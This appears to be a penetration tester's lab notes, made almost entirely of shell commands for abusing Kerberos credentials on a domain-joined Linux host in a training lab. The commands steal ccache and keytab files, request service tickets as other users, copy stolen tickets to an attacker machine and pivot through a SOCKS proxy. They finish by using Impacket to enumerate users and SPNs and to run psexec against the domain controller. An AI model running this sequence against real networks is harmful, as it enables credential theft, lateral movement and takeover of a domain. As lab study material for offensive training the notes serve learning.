//domain corp1.com
kali@kali:~$ ssh administrator@corp1.com@linuxvictim

//we can find the administrator’s credential cache file by examining the list of
//environment variables with env and filtering out the one we want with grep.

administrator@corp1.com@linuxvictim:~$ env | grep KRB5CCNAME

#kinit command with user’s AD password entered is used to acquire a Kerberos ticket-granting ticket (TGT) for the current user.

administrator@corp1.com@linuxvictim:~$ kinit

#The klist command is used to list tickets currently stored in the user’s credential cache file.

administrator@corp1.com@linuxvictim:~$ klist

//discard all cached tickets for the current user, we can use the kdestroy command without parameters.

administrator@corp1.com@linuxvictim:~$ kdestroy

#get a list of available Service Principal Names (SPN) from the domain controller 

administrator@corp1.com@linuxvictim:~$ ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com - D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName

//GSSAPI forces to use Kerberos authentication, therefore is a password is prompted, enter empty)

#request a service ticket from Kerberos for the MSSQL SPN 

administrator@corp1.com@linuxvictim:/tmp$ kvno MSSQLSvc/DC01.corp1.com:1433

administrator@corp1.com@linuxvictim:/tmp$ klist

###Stealing Keytab Files####
//Keytab files contain a Kerberos principal name and encrypted keys and permit user or script to authenticate to Kerberos resources elsewhere on
//the network on the principal’s behalf without entering a password.

#create a sample demonstration keytab for domain Administrator with ktutil

administrator@corp1.com@linuxvictim:~$ ktutil
ktutil: addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
Password for administrator@CORP1.COM:
ktutil: wkt /tmp/administrator.keytab
ktutil: quit

#Use the keytab file 
root@linuxvictim:~# kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
root@linuxvictim:~# klist

root@linuxvictim:~# smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$

#Renew the keytab file before expiration
root@linuxvictim:~# kinit -R

#Extract keytab file
python3 /opt/KeyTabExtract/keytabextract.py krb5.keytab

###Attacking Using Credential Cache Files###
//user’s ccache file is stored in /tmp with a format like /tmp/krb5cc_.
offsec@linuxvictim:~$ ls -al /tmp/krb5cc_*
offsec@linuxvictim:~$ sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
offsec@linuxvictim:~$ sudo chown offsec:offsec /tmp/krb5cc_minenow
offsec@linuxvictim:~$ ls -al /tmp/krb5cc_minenow

offsec@linuxvictim:~$ kdestroy
offsec@linuxvictim:~$ klist

offsec@linuxvictim:~$ export KRB5CCNAME=/tmp/krb5cc_minenow
offsec@linuxvictim:~$ klist

//request service tickets on their behalf
offsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433

offsec@linuxvictim:~$ klist

###Using Kerberos with Impacket###
//copy our victim’s stolen ccache file to our Kali VM and set the KRB5CCNAME environment
kali@kali:~$ scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
kali@kali:~$ export KRB5CCNAME=/tmp/krb5cc_minenow

//install the Kerberos linux client utilities
kali@kali:~$ sudo apt install krb5-user

//add the domain controller IP to our Kali VM
offsec@linuxvictim:~$ sudo echo '192.168.120.5 CORP1.COM DC01.CORP1.COM' >> /etc/hosts 

//In order to use our Kerberos tickets, we will need to have the correct source IP, which in this case
//is the compromised linuxvictim host that is joined to the domain. Because of this, we’ll need to
//setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain
//joined host when interacting with Kerberos.

#comment out the line for proxy_dns in /etc/proxychains.conf to prevent issues with domain name resolution while using proxychains.
offsec@linuxvictim:~$ sudo sed -i 's/^proxy_dns/#proxy_dns/' /etc/proxychains.conf 

#run the socks proxy
kali@kali:~$ ssh offsec@linuxvictim -D 9050

#use impacket for exploit 
kali@kali:~$ proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator

kali@kali:~$ proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator

kali@kali:~$ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass